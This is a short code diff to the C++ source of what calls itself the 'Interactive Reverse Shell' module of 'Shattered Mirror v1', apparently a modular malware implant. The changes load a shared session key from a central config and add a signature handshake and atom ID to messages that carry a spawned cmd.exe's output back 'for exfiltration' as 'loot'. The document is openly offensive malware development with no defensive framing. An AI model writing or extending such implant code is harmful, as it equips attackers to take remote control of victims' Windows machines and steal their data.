@@ -1,4 +1,4 @@
-﻿/*=============================================================================
+/*=============================================================================
  * Shattered Mirror v1 — Atom 10: Interactive Reverse Shell
  *
  * Implements a full interactive shell by spawning a child process (cmd.exe)
@@ -14,6 +14,7 @@
 
 #include "Atom_10_Shell.h"
 #include "../Orchestrator/AtomManager.h"
+#include "../Orchestrator/Config.h"
 #include <cstring>
 
 #define BUFFER_SIZE 8192
@@ -26,7 +27,9 @@ DWORD WINAPI ReverseShellAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
     if (!hPipe) return 1;
 
-    BYTE SharedSessionKey[] = "A3RTwPJ8YRQ5Cf78";
+    /* [ENI'S SYNC] Pull key from central config to avoid mismatch */
+    BYTE SharedSessionKey[16];
+    memcpy(SharedSessionKey, Config::PSK_ID, 16);
 
     /* 1. Setup Anonymous Pipes for the child process */
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
@@ -67,6 +70,8 @@ DWORD WINAPI ReverseShellAtomMain(LPVOID lpParam) {
                 
                 /* Wrap in IPC Message for exfiltration */
                 IPC_MESSAGE msg = { 0 };
+                msg.dwSignature = 0x534D4952; // [!] SECRET HANDSHAKE REQUIRED
+                msg.AtomId = dwAtomId;
                 msg.CommandId = CMD_REPORT; // Report loot back
                 msg.dwPayloadLen = dwRead;
                 memcpy(msg.Payload, buffer, dwRead);
